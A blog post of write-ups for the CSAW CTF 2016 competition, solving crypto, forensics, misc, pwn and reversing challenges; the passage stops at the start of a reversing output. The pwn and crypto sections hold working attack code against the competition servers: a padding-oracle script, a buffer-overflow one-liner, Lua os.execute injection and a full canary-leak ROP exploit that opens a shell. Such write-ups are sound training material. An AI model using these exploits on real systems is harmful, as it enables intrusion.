---
layout: post
title: "CSAW CTF 2016"
categories: exploits ctf
toc: true
---
# Notesy 2.0 (crypto / 1)

The first idea was to submit the same flag as 
the last [year](https://github.com/ctfs/write-ups-2015/tree/master/csaw-ctf-2015/crypto/notesy-100), but this time 
the solution was the alphabet:

```
abcdefghijklmnopqrstuvwxyz
```

# Sleeping Guard (crypto / 50)

```
$ nc crypto.chal.csaw.io 8000 | base64 -D > img-encrypted.png
```

From the source code we can see the key length (12), used to XOR the image:

```python
import base64
from twisted.internet import reactor, protocol
import os

PORT = 9013

import struct
def get_bytes_from_file(filename):
    return open(filename, "rb").read()

KEY = "[CENSORED]"

def length_encryption_key():
    return len(KEY)

def get_magic_png():
    image = get_bytes_from_file("./sleeping.png")
    encoded_string = base64.b64encode(image)
    key_len = length_encryption_key()
    print 'Sending magic....'
    if key_len != 12:
        return ''
    return encoded_string


class MyServer(protocol.Protocol):
    def connectionMade(self):
        resp = get_magic_png()
        self.transport.write(resp)

class MyServerFactory(protocol.Factory):
    protocol = MyServer

factory = MyServerFactory()
reactor.listenTCP(PORT, factory)
reactor.run()
```

The first few bytes of the legitimate `png` file should look like:

```
00000000  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.PNG........IHDR|
```

Using this information and [xortool-xor](https://github.com/hellman/xortool), 
we were able to extract the file manually:

```
$ xortool-xor -f img-encrypted.png -s "\x89"  | hexdump -C | head -1
00000000  57 b6 86 a6 db c2 cc c8  ec f0 a8 bb 97 ae 8c b3  |W...............|

$ xortool-xor -f img-encrypted.png -s "\x57"  | hexdump -C | head -1
00000000  89 68 58 78 05 1c 12 16  32 2e 76 65 49 70 52 6d  |.hXx....2.veIpRm|

$ xortool-xor -f img-encrypted.png -s "\x57\x50"  | hexdump -C | head -1
00000000  89 6f 58 7f 05 1b 12 11  32 29 76 62 49 77 52 6a  |.oX.....2)vbIwRj|

$ xortool-xor -f img-encrypted.png -s "\x57\x6f"  | hexdump -C | head -1
00000000  89 50 58 40 05 24 12 2e  32 16 76 5d 49 48 52 55  |.PX@.$..2.v]IHRU|
```

```
$ xortool-xor -f img-encrypted.png -s "\x57\x6f\x41\x68\x5f\x41\x5f\x4b\x65\x79\x21\x3f"  > flag.png
```

Finally, we read the answer from the png file:

```
flag{l4zy_H4CK3rs_d0nt_g3t_MAg1C_FLaG5}
```

# Neo (crypto / 200)

Oracle Padding Attack, AES with block size = 16. 

```python
#!/usr/bin/env python

# -*- coding: utf-8 -*-

from paddingoracle import BadPaddingException, PaddingOracle
from base64 import b64encode, b64decode
from urllib import quote, unquote
from time import sleep

import requests
import socket

class PadBuster(PaddingOracle):
    def __init__(self, **kwargs):
        super(PadBuster, self).__init__(**kwargs)
        self.session = requests.Session()
        self.wait = kwargs.get('wait', 2.0)

    def oracle(self, data, **kwargs):
        somecookie = b64encode(data)
        payload = {'matrix-id': somecookie }

        print(repr('Data: ' + data))
        print(repr('Payload: ' + somecookie))

        while True:
            try:
                response = self.session.post('http://crypto.chal.csaw.io:8001', data = payload, stream=False, timeout=5, verify=False)
                break
            except (socket.error, requests.exceptions.RequestException):
                logging.exception('Retrying request in %.2f seconds...', self.wait)
                sleep(self.wait)
                continue

        self.history.append(response)

        if response.text.find("Caught exception during AES decryption...") == -1:
            logging.debug('No padding exception raised on %r', somecookie)
            return

        raise BadPaddingException


if __name__ == '__main__':
    import logging
    import sys

    if not sys.argv[1:]:
        print 'Usage: %s <somecookie value>' % (sys.argv[0], )
        sys.exit(1)

    logging.basicConfig(level=logging.INFO)

    encrypted_cookie = b64decode(unquote(sys.argv[1]))

    padbuster = PadBuster()
    cookie = padbuster.decrypt(encrypted_cookie, block_size=16)

    print('Decrypted somecookie: %s => %r' % (sys.argv[1], cookie))
```

Solution:

```
Decrypted somecookie: Wre7CkPi+rFZpTzV+TAtIHzHNtILVrx2XRdynvWoQVrK88FWdeMvn8QmM2RzWzuNbaIwf9m6RfMhwZKmzIqbQ+zMdSFLZ41Y4Db+q3JZOg0= => 
bytearray(b'flag{what_if_i_told_you_you_solved_the_challenge}\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f')
```

References:

[https://github.com/mwielgoszewski/python-paddingoracle](https://github.com/mwielgoszewski/python-paddingoracle)

# Kill (forensics / 50)

There is a broken `pcap` file, which we need to fix. Looks like the file was obtained using tool `dumpcap` on Mac OS X:

```
$ hexdump -C kill.pcapng | head
00000000  aa dd dd aa 8c 00 00 00  4d 3c 2b 1a 01 00 00 00  |........M<+.....|
00000010  ff ff ff ff ff ff ff ff  03 00 2f 00 4d 61 63 20  |........../.Mac |
00000020  4f 53 20 58 20 31 30 2e  31 31 2e 36 2c 20 62 75  |OS X 10.11.6, bu|
00000030  69 6c 64 20 31 35 47 31  30 30 34 20 28 44 61 72  |ild 15G1004 (Dar|
00000040  77 69 6e 20 31 35 2e 36  2e 30 29 00 04 00 34 00  |win 15.6.0)...4.|
00000050  44 75 6d 70 63 61 70 20  31 2e 31 32 2e 34 20 28  |Dumpcap 1.12.4 (|
00000060  76 31 2e 31 32 2e 34 2d  30 2d 67 62 34 38 36 31  |v1.12.4-0-gb4861|
00000070  64 61 20 66 72 6f 6d 20  6d 61 73 74 65 72 2d 31  |da from master-1|
00000080  2e 31 32 29 00 00 00 00  8c 00 00 00 01 00 00 00  |.12)............|
00000090  60 00 00 00 01 00 00 00  00 00 04 00 02 00 06 00  |`...............|
```

If we sniff some of our traffic, we can check if the header matches, but instead of `aa dd dd aa` the file starts with `0a 0d 0d 0a`.

```
$ dumpcap
Capturing on 'eth0'
File: /tmp/wireshark_eth0_20160914212455_WgZFXm.pcapng
Packets captured: 4
Packets received/dropped on interface 'eth0': 4/2 (pcap:1/dumpcap:0/flushed:1/ps_ifdrop:0) (66.7%)
```

```
$ hexdump -C /tmp/wireshark_eth0_20160914212440_jsZWs2.pcapng | head -1
00000000  0a 0d 0d 0a 7c 00 00 00  4d 3c 2b 1a 01 00 00 00  |....|...M<+.....|
```

After we edit the first four bytes and open the file with Wireshark, we read the flag in one of the streams (3).

Easier solution is to read the flag directly on these addresses:

```
006c7d0: ff e0 ba e0 4a 46 49 46 00 01 01 01 00 01 00 01  ....JFIF........
006c7e0: 00 00 ff fe 00 3d 66 6c 61 67 7b 72 6f 73 65 73  .....=flag{roses
006c7f0: 5f 72 5f 62 6c 75 65 5f 76 69 6f 6c 65 74 73 5f  _r_blue_violets_
006c800: 72 5f 72 33 64 5f 6d 61 79 62 33 5f 68 61 72 61  r_r3d_mayb3_hara
006c810: 6d 62 61 65 5f 69 73 5f 6e 6f 74 5f 6b 69 6c 6c  mbae_is_not_kill
006c820: 7d ff ed 00 9c 50 68 6f 74 6f 73 68 6f 70 20 33  }....Photoshop 3
```

# Clams Don't Dance (forensics / 100)

We use `The Sleuth Kit` to analyse the image:

```
$ fls out.img
r/r 3:  USB         (Volume Label Entry)
r/r 5:  ._.Trashes
d/d 7:  .Trashes
d/d 10: .Spotlight-V100
d/d 12: .fseventsd
r/r * 14:   clam.pptx
r/r 16: dance.mp4
v/v 3270243:    $MBR
v/v 3270244:    $FAT1
v/v 3270245:    $FAT2
d/d 3270246:    $OrphanFiles
```

`clam.pptx` looks suspicious so we extract it:

```
$ icat out.img 14 > clam.pptx
```

When we `unzip` the `pptx`, there is one file (`image0.gif`) which has a different timestamp and moreover it is not linked in the document:

```
$ ls -lt
total 9488
-rw-r--r--  1 sine  staff    6979 Sep  6 11:25 image0.gif
-rw-rw-r--  1 sine  staff   30602 Jan  1  1980 image1.jpg
-rw-rw-r--  1 sine  staff   29515 Jan  1  1980 image10.jpg
-rw-rw-r--  1 sine  staff   23499 Jan  1  1980 image11.png
-rw-rw-r--  1 sine  staff   18897 Jan  1  1980 image12.png
-rw-rw-r--  1 sine  staff   53048 Jan  1  1980 image13.jpg
-rw-rw-r--  1 sine  staff   30865 Jan  1  1980 image14.jpg
-rw-rw-r--  1 sine  staff   34211 Jan  1  1980 image15.jpg
-rw-rw-r--  1 sine  staff   38920 Jan  1  1980 image16.jpg
-rw-rw-r--  1 sine  staff   24656 Jan  1  1980 image17.jpg
-rw-rw-r--  1 sine  staff   20048 Jan  1  1980 image18.gif
-rw-rw-r--  1 sine  staff  118081 Jan  1  1980 image19.png
-rw-rw-r--  1 sine  staff   89395 Jan  1  1980 image2.jpg
-rw-rw-r--  1 sine  staff   80663 Jan  1  1980 image20.jpg
-rw-rw-r--  1 sine  staff   65815 Jan  1  1980 image21.jpg
-rw-rw-r--  1 sine  staff  258672 Jan  1  1980 image22.png
-rw-rw-r--  1 sine  staff    8319 Jan  1  1980 image23.jpg
-rw-rw-r--  1 sine  staff  232546 Jan  1  1980 image24.png
-rw-rw-r--  1 sine  staff    5277 Jan  1  1980 image25.png
-rw-rw-r--  1 sine  staff  124208 Jan  1  1980 image26.jpg
-rw-rw-r--  1 sine  staff  253876 Jan  1  1980 image27.png
-rw-rw-r--  1 sine  staff  329579 Jan  1  1980 image28.png
-rw-rw-r--  1 sine  staff  379591 Jan  1  1980 image29.png
-rw-rw-r--  1 sine  staff   29635 Jan  1  1980 image3.jpg
-rw-rw-r--  1 sine  staff  396789 Jan  1  1980 image30.png
-rw-rw-r--  1 sine  staff  231275 Jan  1  1980 image31.jpg
-rw-rw-r--  1 sine  staff    8176 Jan  1  1980 image32.gif
-rw-rw-r--  1 sine  staff   29956 Jan  1  1980 image33.jpg
-rw-rw-r--  1 sine  staff   32790 Jan  1  1980 image34.jpg
-rw-rw-r--  1 sine  staff   21739 Jan  1  1980 image35.jpg
-rw-rw-r--  1 sine  staff   20837 Jan  1  1980 image36.jpg
-rw-rw-r--  1 sine  staff  359819 Jan  1  1980 image37.png
-rw-rw-r--  1 sine  staff   70181 Jan  1  1980 image38.png
-rw-rw-r--  1 sine  staff   23371 Jan  1  1980 image39.png
-rw-rw-r--  1 sine  staff   11919 Jan  1  1980 image4.png
-rw-rw-r--  1 sine  staff   18374 Jan  1  1980 image40.jpg
-rw-rw-r--  1 sine  staff   60743 Jan  1  1980 image41.jpg
-rw-rw-r--  1 sine  staff  608631 Jan  1  1980 image5.png
-rw-rw-r--  1 sine  staff   32615 Jan  1  1980 image6.png
-rw-rw-r--  1 sine  staff   12219 Jan  1  1980 image7.jpg
-rw-rw-r--  1 sine  staff  467084 Jan  1  1980 image8.jpg
-rw-rw-r--  1 sine  staff   84197 Jan  1  1980 image9.jpg
```

It reminds us the `Maxicode`, using [QR Code (2D Barcode) Reader](http://www.funcode-tech.com/Download_en.html) 
we can read it. We scanned it with this [iPhone App](https://itunes.apple.com/tw/app/logo-qr-barcode-scanner/id1142976425?mt=8).

```
FLAG{TH1NK ABOUT 1T B1LL. 1F U D13D, WOULD ANY1 CARE??}
```

# evidence.zip (forensics / 100)

The flag is hidden in CRC values:

```
$ zipinfo -v evidence.zip | grep CRC
  32-bit CRC value (hex):                         666c6167
  32-bit CRC value (hex):                         7b746833
  32-bit CRC value (hex):                         5f766931
  32-bit CRC value (hex):                         3169346e
  32-bit CRC value (hex):                         5f77335f
  32-bit CRC value (hex):                         6e333364
  32-bit CRC value (hex):                         5f236672
  32-bit CRC value (hex):                         65656c65
  32-bit CRC value (hex):                         6666656e
  32-bit CRC value (hex):                         7daaaaaa
  32-bit CRC value (hex):                         aaaaaaaa
  32-bit CRC value (hex):                         aaaaaaaa
  32-bit CRC value (hex):                         aaaaaaaa
```

```
$ for x in $(zipinfo -v evidence.zip | grep CRC | cut -d: -f 2 | sed 's# +#0x#g'); do export x; python -c 'import os; from struct import pack; from sys import stdout; stdout.write( pack(">I", int(os.environ["x"], 16)) )'; done
flag{th3_vi11i4n_w3_n33d_#freeleffen}
```

# Watchword (forensics / 250)

I solved the challenge after they published two hints:

```
Hint: http://domnit.org/stepic/doc/

Hint: It's not base64, but it uses the Python 3 base64 module

password = password
```

There was a comment in `exif` header, `base64` encoded:

```
$ exiftool powpow.mp4 | grep Title | cut -d: -f2 | tr -d ' ' | base64 -d

http://steghide.sourceforge.net/
```

We extracted the `png` image from the `mp4` file:
```
$ binwalk powpow.mp4

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
547541        0x85AD5         PNG image, 720 x 581, 8-bit/color RGB, non-interlaced
547595        0x85B0B         Zlib compressed data, default compression
547904        0x85C40         Zlib compressed data, default compression
```

```
$ dd if=powpow.mp4 bs=1 skip=547541 > image.png
419063+0 records in
419063+0 records out
419063 bytes (419 kB, 409 KiB) copied, 0.363718 s, 1.2 MB/s
```

Using `stepic`, we extracted the another image (`jpg`) from `png`:

```
$ stepic -d -i image.png  > image.jpg
```

There are hidden some data, we can recoved them using `password` passphrase:

```
$ steghide info image.jpg
"image.jpg":
  format: jpeg
  capacity: 1.7 KB
Try to get information about embedded data ? (y/n) n
```

```
$ steghide extract -sf image.jpg -p password
wrote extracted data to "base64.txt"
```

Finally with python3 `base64` module, we use `b85decode` to read the flag:

```
$ python3

>>> f = open("base64.txt", "r")
>>> data = f.read().rstrip()
>>> f.close()

>>> from base64 import b85decode
>>> b85decode(data)
b'flag{We are fsociety, we are finally free, we are finally awake!}'
```

# Coinslot (misc / 25)

```python
#!/usr/bin/env python

from pwn import *

r = remote('misc.chal.csaw.io', '8000')

def process():
    value = float(r.recvline()[1:])

    bills = [10000, 5000, 1000, 500, 100, 50, 20, 10, 5, 1, 0.50, 0.25, 0.10, 0.05, 0.01]
    counter = dict.fromkeys(bills, 0)

    print('input: ' + str(value))
    for bill in bills:
        # the second condition is because we are using float
        while value - bill > 0 or abs(value - bill) < 0.005:
            counter[bill] += 1
            value -= bill

        r.recvuntil(': ')
        r.sendline(str(counter[bill]))

    return r.recvline()

while True:
  print process()
```

```
$ python ./coinbase.py DEBUG
[ .. SNIP .. ]

[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0xe bytes:
    'nickels (5c): '
[DEBUG] Sent 0x2 bytes:
    '0\n'
[DEBUG] Received 0xe bytes:
    'pennies (1c): '
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Received 0x47 bytes:
    'correct!\n'
    'flag{started-from-the-bottom-now-my-whole-team-fucking-here}\n'
    '\n'
correct!

Traceback (most recent call last):
  File "./coinbase.py", line 26, in <module>
    print process()
  File "./coinbase.py", line 8, in process
    value = float(r.recvline()[1:])
ValueError: could not convert string to float: lag{started-from-the-bottom-now-my-whole-team-fucking-here}

[*] Closed connection to misc.chal.csaw.io port 8000
```

# Warmup (pwn / 50)

There is a backdoor in the binary and the address is even printed after it starts:
```
$ objdump -M intel -d warmup | grep "<easy>" -A 6
000000000040060d <easy>:
  40060d:   55                      push   rbp
  40060e:   48 89 e5                mov    rbp,rsp
  400611:   bf 34 07 40 00          mov    edi,0x400734
  400616:   e8 b5 fe ff ff          call   4004d0 <system@plt>
  40061b:   5d                      pop    rbp
  40061c:   c3                      ret
```

Trivial buffer overflow:
```
$ gdb -q ./warmup
Reading symbols from ./warmup...(no debugging symbols found)...done.
```

```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

```
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
```

```
gdb-peda$ r
Starting program: /root/warmup
-Warm Up-
WOW:0x40060d
>AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

   0x40069e <main+129>: call   0x400500 <gets@plt>
   0x4006a3 <main+134>: leave
=> 0x4006a4 <main+135>: ret

Stopped reason: SIGSEGV
0x00000000004006a4 in main ()
```

```
gdb-peda$ x /gx $rsp
0x7fffffffe878: 0x4134414165414149
```

```
gdb-peda$ pattern offset 0x4134414165414149
4698452060381725001 found at offset: 72
```

```
$ python -c 'from struct import pack as p; print "A" * 72 + p("Q", 0x40060d)' | nc pwn.chal.csaw.io 8000
-Warm Up-
WOW:0x40060d
>FLAG{LET_US_BEGIN_CSAW_2016}
```

# Aul (pwn / 100)

If we invoke the `help` command, we can notice that the interpreter is `lua`:

```
$ nc pwn.chal.csaw.io 8001
let's play a game
| 0 0 0 0 0 0 0 0 |
| 0 1 0 0 0 0 4 0 |
| 0 3 2 2 4 1 4 4 |
| 0 3 2 3 2 3 4 3 |
| 4 b 2 2 4 4 3 4 |
| 3 2 4 4 1 1 2 2 |
| 3 3 c d 3 3 2 3 |
| 3 2 1 4 4 a 2 4 |
help
help
LuaS�
[ .. SNIP .. ]
```

If the command is evaluated directly, this should work too:

```
$ nc pwn.chal.csaw.io 8001
let's play a game
| 0 0 0 0 0 0 0 0 |
| 0 1 0 0 0 0 4 0 |
| 0 3 2 2 4 1 4 4 |
| 0 3 2 3 2 3 4 3 |
| 4 b 2 2 4 4 3 4 |
| 3 2 4 4 1 1 2 2 |
| 3 3 c d 3 3 2 3 |
| 3 2 1 4 4 a 2 4 |
io.write("Hello world, from ",_VERSION,"!\n")
io.write("Hello world, from ",_VERSION,"!\n")
Hello world, from Lua 5.3!
```

Now we can execute arbitrary command, we read the challenge code and the flag:

```lua
$ nc pwn.chal.csaw.io 8001
let's play a game
| 0 0 0 0 0 0 0 0 |
| 0 1 0 0 0 0 4 0 |
| 0 3 2 2 4 1 4 4 |
| 0 3 2 3 2 3 4 3 |
| 4 b 2 2 4 4 3 4 |
| 3 2 4 4 1 1 2 2 |
| 3 3 c d 3 3 2 3 |
| 3 2 1 4 4 a 2 4 |
os.execute("cat server.lua")
os.execute("cat server.lua")
-- http://www.playwithlua.com/?p=28

function make_board(size)
   local board = { size = size }
   setmetatable(board, { __tostring = board_tostring })

   for n = 0, size * size - 1 do
      board[n] = 0
   end

   return board
end

function populate_board(board, filled, seed)
   local size = board.size
   if seed then math.randomseed(seed) end
   filled = filled or size * size * 3 / 4

   local function rand()
      local c
      repeat c = math.random(size * size) - 1 until board[c] == 0
      return c
   end

   if filled > 0 then
      for _,v in ipairs{'a','b','c','d'} do board[rand()] = v end

      for n = 1, filled-4 do
         board[rand()] = math.random(4)
      end

      return fall(board)
   end
end

function board_tostring(board)
   local lines = {}
   local size = board.size
   for y = 0, size - 1 do
      local line = "|"
      for x = 0, size - 1 do
         line = line .. " " .. board[x+y*size]
      end
      table.insert(lines, line .. " |")
   end
   return table.concat(lines,"\n")
end

function fall(board)
   local size = board.size
   local new_board = make_board(size, 0)

   local function fall_column(col)
      local dest = size - 1
      for y = size-1, 0, -1 do
         if board[y*size + col] ~= 0 then
            new_board[dest*size + col] = board[y*size + col]
            dest = dest - 1
         end
      end
   end

   for x=0, size-1 do
      fall_column(x)
   end

   return new_board
end

function rotate(board)
   local size = board.size
   local new_board = make_board(size, 0)

   for y = 0, size-1 do
      local dest_col = size - 1 - y

      for n = 0, size-1 do
         new_board[n*size + dest_col] = board[y*size + n]
      end
   end

   return new_board
end

function crush(board)
   local size = board.size
   local new_board = make_board(size, 0)
   local crushers = {'a','b','c','d'}

   for n=0, size-1 do
      new_board[n] = board[n]
   end

   for n = size, size*size - 1 do
      if board[n-size] == crushers[board[n]] then
         new_board[n] = 0
      else
         new_board[n] = board[n]
      end
   end

   return new_board
end

function rotate_left(board)
   return rotate(rotate(rotate(board)))
end

function readAll(file)
    local f = io.open(file, "rb")
    local content = f:read("*all")
    f:close()
    return content
end

function help()
    local l = string.sub(readAll("server.luac"), 2)

    writeraw(l, string.len(l))
end

quit = false
function exit()
    quit = true
end

function run_step(board)
   local cmd = readline()

   if(string.len(cmd) == 0) then
     exit()
     return nil
   end

   -- prevent injection attacks
   if(string.find(cmd, "function")) then
     return nil
   end

   if(string.find(cmd, "print")) then
     return nil
   end

   local f = load("return " .. cmd)()

   if f == nil then
     return nil
   end

   return f(board)
end

function game()
   local board = populate_board(make_board(8))

   repeat

      writeline(board_tostring(board) .. "\n")

      local b = run_step(board)

      if quit then
        break
      end

      if b ~= nil then
         board = b
         board = fall(crush(fall(board)))
      else
         writeline("Didn't understand. Type 'rotate', 'rotate_left', 'exit', or 'help'.\n")
      end

   until false
end

writeline("let's play a game\n")

game()
```

```
$ nc pwn.chal.csaw.io 8001
let's play a game
| 0 0 0 0 0 0 0 0 |
| 0 1 0 0 0 0 4 0 |
| 0 3 2 2 4 1 4 4 |
| 0 3 2 3 2 3 4 3 |
| 4 b 2 2 4 4 3 4 |
| 3 2 4 4 1 1 2 2 |
| 3 3 c d 3 3 2 3 |
| 3 2 1 4 4 a 2 4 |
os.execute("ls")
os.execute("ls")
flag  run.sh  scripty  server.lua  server.luac
```

```
$ nc pwn.chal.csaw.io 8001
let's play a game
| 0 0 0 0 0 0 0 0 |
| 0 1 0 0 0 0 4 0 |
| 0 3 2 2 4 1 4 4 |
| 0 3 2 3 2 3 4 3 |
| 4 b 2 2 4 4 3 4 |
| 3 2 4 4 1 1 2 2 |
| 3 3 c d 3 3 2 3 |
| 3 2 1 4 4 a 2 4 |
os.execute("cat flag")
os.execute("cat flag")
flag{we_need_a_real_flag_for_this_chal}
```

# Tutorial (pwn / 200)

```
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

As we can see, the binary contains NX + canary. Still this does not mean that the exploitation would be more difficult, 
because there is a puts leak (option 1) and canary leak (option 2).

Exploit:

```python
#!/usr/bin/env python

from pwn import *
from sys import argv

local = False

def p(string): print text.green_on_black("[*] " + string)

def leak_canary():
  x.send("2\n\n")
  x.recvline()
  x.recvline()
  return u64(x.recvline()[311:319])

def leak_puts_address():
  x.send("1\n")
  x.recvuntil("Reference:")
  puts_addr = int(x.recvline().rstrip(), 16) + 0x500
  x.recvuntil('>')
  return puts_addr

def send_exploit(canary, system, shell, dup2, descriptor):
  pop_rdi_ret_address = 0x4012e3
  pop_rsi_pop_r15_ret_address = 0x4012e1

  x.sendline("2")
  x.recvuntil('>')

  payload  = "A" * 312
  payload += p64(canary)
  payload += "Aa0Aa1Aa"

  """
  dup2(rdi = 5, rsi = 0)
  dup2(rdi = 5, rsi = 1)
  """
  payload += p64(pop_rdi_ret_address)
  payload += p64(descriptor)

  payload += p64(pop_rsi_pop_r15_ret_address)
  payload += p64(0)
  payload += p64(0xdeadbeef)
  payload += p64(dup2)

  payload += p64(pop_rsi_pop_r15_ret_address)
  payload += p64(1)
  payload += p64(0xdeadbeef)
  payload += p64(dup2)

  payload += p64(pop_rdi_ret_address)
  payload += p64(shell)

  payload += p64(system)

  x.sendline(payload)

if __name__ == "__main__":

  if local:
    x = remote('127.0.0.1', argv[1])
    libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
    descriptor = 5
  else:
    x = remote('pwn.chal.csaw.io', '8002')
    libc = ELF('./libc-2.19.so')
    descriptor = 4
    
  x.recvuntil(">")

  canary_leak = leak_canary()
  p(hex(canary_leak) + " <- leaked canary")

  puts_leak = leak_puts_address()
  p(hex(puts_leak) + " <- leaked puts() address")

  libc.address = puts_leak - libc.symbols['puts']
  p(hex(libc.address) + " <- libc base address")

  system_address = libc.symbols['system']
  p(hex(system_address) + " <- computed system() address")

  dup2_address = libc.symbols['dup2']
  p(hex(dup2_address) + " <- computed dup2() address")

  shell_address = next(libc.search('sh\x00'))
  p(hex(shell_address) + " <- computed 'sh\\x00' address")

  send_exploit(canary_leak, system_address, shell_address, dup2_address, descriptor)

  x.interactive()
```

```
$ ./exploit.py
[+] Opening connection to pwn.chal.csaw.io on port 8002: Done
[*] '/root/Tutorial/libc-2.19.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] 0xb07981a03b326d00 <- leaked canary
[*] 0x7f70aa363d60 <- leaked puts() address
[*] 0x7f70aa2f4000 <- libc base address
[*] 0x7f70aa33a590 <- computed system() address
[*] 0x7f70aa3dfe90 <- computed dup2() address
[*] 0x7f70aa305c37 <- computed 'sh\x00' address
[*] Switching to interactive mode
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00m2;\xa0\x81y\xb0Aa0A$ id
uid=1000(tutorial) gid=1000(tutorial) groups=1000(tutorial)
$ ls
flag.txt
tutorial
tutorial.c
```

`tutorial.c`:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <pwd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <dlfcn.h>
#include <errno.h>
#include <signal.h>
#include <unistd.h>
#include <stdint.h>

int priv(char *username) {
    struct passwd *pw = getpwnam(username);
    if (pw == NULL) {
        fprintf(stderr, "User %s does not exist\n", username);
        return 1;
    }

    if (chdir(pw->pw_dir) != 0) {
        perror("chdir");
        return 1;
    }


    if (setgroups(0, NULL) != 0) {
        perror("setgroups");
        return 1;
    }

    if (setgid(pw->pw_gid) != 0) {
        perror("setgid");
        return 1;
    }

    if (setuid(pw->pw_uid) != 0) {
        perror("setuid");
        return 1;
    }

    return 0;
}

void func1(int fd){


    char address[50];
    void (*puts_addr)(int) = dlsym(RTLD_NEXT,"puts");
        write(fd,"Reference:",10);
    sprintf(address,"%p\n",puts_addr-0x500);
        write(fd,address,15);



}

void func2(int fd){
    char pov[300];
    bzero(pov,300);

    write(fd,"Time to test your exploit...\n",29);
    write(fd,">",1);
    read(fd,pov,460);
    write(fd,pov,324);

}



void menu(int fd){
    while(1){
        char option[2];
        write(fd,"-Tutorial-\n",11);
        write(fd,"1.Manual\n",9);
        write(fd,"2.Practice\n",11);
        write(fd,"3.Quit\n",7);
        write(fd,">",1);        read(fd,option,2);
        switch(option[0]){
            case '1':
                func1(fd);
                break;
            case '2':
                func2(fd);
                break;
            case '3':
                write(fd,"You still did not solve my challenge.\n",38);
                return;
            default:
                write(fd,"unknown option.\n",16);
                break;
        }
    }
}

int main( int argc, char *argv[] ) {
  int five;
  int myint = 1;
  struct sockaddr_in server,client;
  sigemptyset((sigset_t *)&five);
  int init_fd = socket(AF_INET, SOCK_STREAM, 0);

  if (init_fd == -1) {
     perror("socket");
     exit(-1);
  }
  bzero((char *) &server, sizeof(server));

  if(setsockopt(init_fd,SOL_SOCKET,SO_REUSEADDR,&myint,sizeof(myint)) == -1){
    perror("setsocket");
      exit(-1);
  }

  server.sin_family = AF_INET;
  server.sin_addr.s_addr = htonl(INADDR_ANY);
  server.sin_port = htons(atoi(argv[1]));

  if (bind(init_fd, (struct sockaddr *) &server, sizeof(server)) == -1) {
     perror("bind");
     exit(-1);
  }

  if((listen(init_fd,20)) == -1){
     perror("listen");
     exit(-1);
  }
  int addr_len = sizeof(client);

   while (1) {

        int fd = accept(init_fd,(struct sockaddr *)&client,(socklen_t*)&addr_len);

     if (fd < 0) {
        perror("accept");
        exit(1);
     }
     pid_t pid = fork();

     if (pid == -1) {
       perror("fork");
       close(fd);
     }

     if (pid == 0){
      alarm(15);
          close(init_fd);
      int user_priv = priv("tutorial");
      if(!user_priv){
              menu(fd);
        close(fd);
            exit(0);
      }
     }else{
            close(fd);
      }

    }
  close(init_fd);
}
```

```
$ cat flag.txt
FLAG{3ASY_R0P_R0P_P0P_P0P_YUM_YUM_CHUM_CHUM}
```

# Gametime (reversing / 50)

There were a several things which we manually patched (keypresses, time delay), this part of the program was 
called often and we negated the condition on `0x00401554` to `je` to pass the check:

```
.text:00401549 8B CF                             mov     ecx, edi
.text:0040154B E8 10 FD FF FF                    call    sub_401260
.text:00401550 5F                                pop     edi
.text:00401551 5E                                pop     esi
.text:00401552 84 C0                             test    al, al
.text:00401554 75 21                             jnz     short loc_401577
.text:00401556 FF 75 0C                          push    [ebp+arg_4]
.text:00401559 FF 75 10                          push    [ebp+arg_8]
.text:0040155C 68 50 7A 41 00                    push    offset aKeyIsSS_0 ; "key is %s (%s)\r"
.text:00401561 E8 F5 04 00 00                    call    print_something
.text:00401566 68 B0 7A 41 00                    push    offset aUdderFailure_0 ; "UDDER FAILURE! http://imgur.com/4Ajx21P"...
.text:0040156B E8 EB 04 00 00                    call    print_something
.text:00401570 83 C4 10                          add     esp, 10h
.text:00401573 32 C0                             xor     al, al
.text:00401575 5D                                pop     ebp
.text:00401576 C3                                retn
```

The goal was to reach this part to print the flag:

```
.text:00401973 0F B6 06                          movzx   eax, byte ptr [esi]
.text:00401976 50                                push    eax
.text:00401977 68 DC 7A 41 00                    push    offset a02x     ; "%02x"
.text:0040197C E8 DA 00 00 00                    call    print_something
.text:00401981 59                                pop     ecx
.text:00401982 46                                inc     esi
.text:00401983 59                                pop     ecx
.text:00401984 83 EB 01                          sub     ebx, 1
.text:00401987 75 EA                             jnz     short loc_401973
.text:00401989 68 E4 7A 41 00                    push    offset asc_417AE4 ; ")\n\n"
.text:0040198E E8 C8 00 00 00                    call    print_something
.text:00401993 8B 1D 20 21 41 00                 mov     ebx, ds:Sleep
.text:00401999 59                                pop     ecx
```

Finally the whole output:
```
